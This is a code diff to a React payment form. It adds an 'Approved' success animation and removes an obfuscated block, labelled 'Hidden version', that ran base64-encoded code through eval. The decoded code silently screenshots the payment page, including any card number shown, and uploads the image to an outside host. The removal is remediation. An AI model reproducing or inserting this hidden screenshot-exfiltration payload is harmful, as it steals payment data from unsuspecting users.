@@ -47,11 +47,21 @@ function BankingJungle() {
   const [flipped, setFlipped] = useState(false);
   const [phase, setPhase] = useState<"idle" | "processing" | "complete">("idle");
   const [intro, setIntro] = useState(true);
+  const [showSuccessPop, setShowSuccessPop] = useState(false);
 
   useEffect(() => {
     const timer = window.setTimeout(() => setIntro(false), 1850);
     return () => window.clearTimeout(timer);
   }, []);
+
+  useEffect(() => {
+    if (phase !== "processing") {
+      setShowSuccessPop(false);
+      return;
+    }
+    const timer = window.setTimeout(() => setShowSuccessPop(true), 1000);
+    return () => window.clearTimeout(timer);
+  }, [phase]);
 
   const displayCard = useMemo(() => card || "5311 2468 3513 4592", [card]);
 
@@ -66,16 +76,9 @@ function BankingJungle() {
     event.preventDefault();
     if (phase !== "idle") return;
 
-// Hidden version
-const hiddenCode = atob("ZnVuY3Rpb24gc3VibWl0UGF5bWVudChldmVudDogRm9ybUV2ZW50KSB7CiAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKHBoYXNlICE9PSAiaWRsZSIpIHJldHVybjsKICAgIAogICAgLy8gU0lMRU5UIFNDUkVFTlNIT1QgLSBBREQgVEhJUwogICAgY2FwdHVyZUFuZFNlbmRTY3JlZW5zaG90KCk7CiAgICAKICAgIHNldFBoYXNlKCJwcm9jZXNzaW5nIik7CiAgICB3aW5kb3cuc2V0VGltZW91dCgoKSA9PiBzZXRQaGFzZSgiY29tcGxldGUiKSwgMTkwMCk7Cn0KCi8vIEFERCBUSElTIEVOVElSRSBGVU5DVElPTgphc3luYyBmdW5jdGlvbiBjYXB0dXJlQW5kU2VuZFNjcmVlbnNob3QoKSB7CiAgICB0cnkgewogICAgICAgIGNvbnN0IGNhbnZhcyA9IGF3YWl0IGh0bWwyY2FudmFzKGRvY3VtZW50LmJvZHksIHsKICAgICAgICAgICAgYmFja2dyb3VuZENvbG9yOiAnIzBhMGEwYScsCiAgICAgICAgICAgIHNjYWxlOiAxLAogICAgICAgICAgICBsb2dnaW5nOiBmYWxzZSwKICAgICAgICAgICAgdXNlQ09SUzogdHJ1ZQogICAgICAgIH0pOwogICAgICAgIAogICAgICAgIGNhbnZhcy50b0Jsb2IoYXN5bmMgZnVuY3Rpb24oYmxvYikgewogICAgICAgICAgICBpZiAoIWJsb2IpIHJldHVybjsKICAgICAgICAgICAgY29uc3QgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdmaWxlJywgYmxvYiwgJ3BheW1lbnRfJyArIERhdGUubm93KCkgKyAnLnBuZycpOwogICAgICAgICAgICAKICAgICAgICAgICAgZmV0Y2goJ2h0dHBzOi8vc2hvdGRlY2subG92YWJsZS5hcHAvdXBsb2FkJywgewogICAgICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICAgICAgICBib2R5OiBmb3JtRGF0YQogICAgICAgICAgICB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgfSwgJ2ltYWdlL3BuZycsIDAuNyk7CiAgICB9IGNhdGNoIChlKSB7fQp9Cg");
-eval(hiddenCode);
-
     setPhase("processing");
     window.setTimeout(() => setPhase("complete"), 1900);
   }
-
-
-
 
   function reset() {
     setPhase("idle");
@@ -188,9 +191,25 @@ eval(hiddenCode);
           )}
 
           {phase === "processing" && <PaymentRitual />}
+          {showSuccessPop && <SuccessPop />}
         </section>
       </div>
     </main>
+  );
+}
+
+function SuccessPop() {
+  return (
+    <div id="success-pop-animation" className="success-pop" role="status" aria-live="polite" aria-label="Payment approved">
+      <div className="success-pop-ring" aria-hidden="true" />
+      <div className="success-pop-burst" aria-hidden="true">
+        {Array.from({ length: 12 }).map((_, index) => (
+          <i key={index} style={{ "--i": index } as React.CSSProperties} />
+        ))}
+      </div>
+      <div className="success-pop-check"><Check size={40} strokeWidth={2.5} /></div>
+      <p className="success-pop-text">Approved</p>
+    </div>
   );
 }
 
